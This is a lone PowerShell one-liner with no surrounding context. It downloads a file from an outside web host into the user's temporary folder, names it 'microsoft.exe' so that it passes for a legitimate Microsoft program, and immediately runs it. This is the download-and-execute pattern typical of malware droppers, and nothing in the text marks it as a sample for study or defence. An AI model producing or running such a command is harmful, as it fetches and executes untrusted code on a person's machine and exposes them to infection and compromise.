
(New-Object System.Net.WebClient).DownloadFile('http://hnng.moe/f/InX',"$env:TEMP\microsoft.exe");Start-Process ("$env:TEMP\microsoft.exe")

